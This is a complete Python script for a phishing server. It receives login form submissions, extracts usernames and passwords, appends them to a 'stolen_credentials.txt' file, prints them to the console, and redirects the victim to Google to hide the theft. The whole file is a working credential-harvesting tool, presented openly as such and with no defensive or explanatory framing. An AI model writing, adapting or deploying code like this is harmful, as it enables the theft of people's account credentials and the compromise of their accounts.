from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class PhishingServer(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Extract credentials
        credentials = urllib.parse.parse_qs(post_data)
        username = credentials.get("username", [""])[0]
        password = credentials.get("password", [""])[0]

        # Save credentials to a file
        try:
            with open("C:/Users/Public/stolen_credentials.txt", "a") as file:
                file.write(f"Username: {username}, Password: {password}\n")
        except PermissionError:
            print("Permission denied: Cannot write to file.")

        # Print to console for testing
        print(f"Captured Credentials -> Username: {username}, Password: {password}")

        # Redirect the victim to Google
        self.send_response(302)
        self.send_header("Content-type", "text/html")
        self.send_header("Location", "https://www.google.com")
        self.end_headers()

# Run the fake server
server_address = ("", 8080)  # Run on port 8080
httpd = HTTPServer(server_address, PhishingServer)
print("Phishing page is running on port 8080...")
httpd.serve_forever()

